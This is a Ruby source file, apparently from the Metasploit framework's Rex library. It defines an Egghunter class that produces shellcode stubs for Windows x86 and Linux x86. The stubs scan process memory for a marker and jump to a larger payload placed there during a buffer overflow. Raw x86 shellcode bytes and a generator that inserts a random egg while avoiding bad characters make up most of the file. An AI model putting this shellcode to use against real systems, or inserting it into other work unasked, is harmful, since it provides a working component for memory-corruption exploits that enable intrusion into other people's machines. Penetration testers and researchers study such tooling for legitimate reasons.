require 'rex/text'
require 'rex/arch'

module Rex
module Exploitation

###
#
# This class provides an interface to generating egghunters.  Egghunters are
# used to search process address space for a known byte sequence.  This is
# useful in situations where there is limited room for a payload when an
# overflow occurs, but it's possible to stick a larger payload somewhere else
# in memory that may not be directly predictable.
#
###
class Egghunter

	###
	#
	# Windows-based egghunters
	#
	###
	module Windows
		Alias = "win"

		module X86
			Alias = ARCH_X86

			#
			# The egg hunter stub for win/x86.
			#
			def hunter_stub
				{
					'Stub' => 
						"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02" +
						"\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8" +
						"\x41\x41\x41\x41" +
						"\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7",
					'EggSize'   => 4,
					'EggOffset' => 0x12
				}
			end
	
		end
	end
	
	###
	#
	# Linux-based egghunters
	#
	###
	module Linux
		Alias = "linux"

		module X86
			Alias = ARCH_X86

			#
			# The egg hunter stub for linux/x86.
			#
			def hunter_stub
				{
					'Stub' => 
						"\xfc\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd\x80" +
						"\x3c\xf2\x74\xf1\xb8" +
						"\x41\x41\x41\x41" +
						"\x89\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7",
					'EggSize'   => 4,
					'EggOffset' => 0x11
				}
			end

		end
	end

	###
	#
	# Generic interface
	#
	###

	#
	# Creates a new egghunter instance and acquires the sub-class that should
	# be used for generating the stub based on the supplied platform and
	# architecture.
	#
	def initialize(platform, arch = nil)
		Egghunter.constants.each { |c|
			mod = self.class.const_get(c)

			next if ((!mod.kind_of?(::Module)) or 
			         (!mod.const_defined?('Alias')))

			if (platform =~ /#{mod.const_get('Alias')}/i)
				self.extend(mod)

				if (arch and mod)
					mod.constants.each { |a|
						amod = mod.const_get(a)

						next if ((!amod.kind_of?(::Module)) or 
						         (!amod.const_defined?('Alias')))

						if (arch =~ /#{mod.const_get(a).const_get('Alias')}/i)
							amod = mod.const_get(a)

							self.extend(amod)
						end
					}
				end
			end
		}
	end

	#
	# This method generates an egghunter using the derived hunter stub.
	#
	def generate(badchars = '')
		return nil if ((opts = hunter_stub) == nil)

		stub  = opts['Stub'].dup
		esize = opts['EggSize']
		eoff  = opts['EggOffset']
		egg   = Rex::Text.rand_text(esize, badchars)

		stub[eoff, esize] = egg

		return [ stub, egg ]
	end

protected

	#
	# Stub method that is meant to be overridden.  It returns the raw stub that
	# should be used as the egghunter.
	#
	def hunter_stub
	end

end

end
end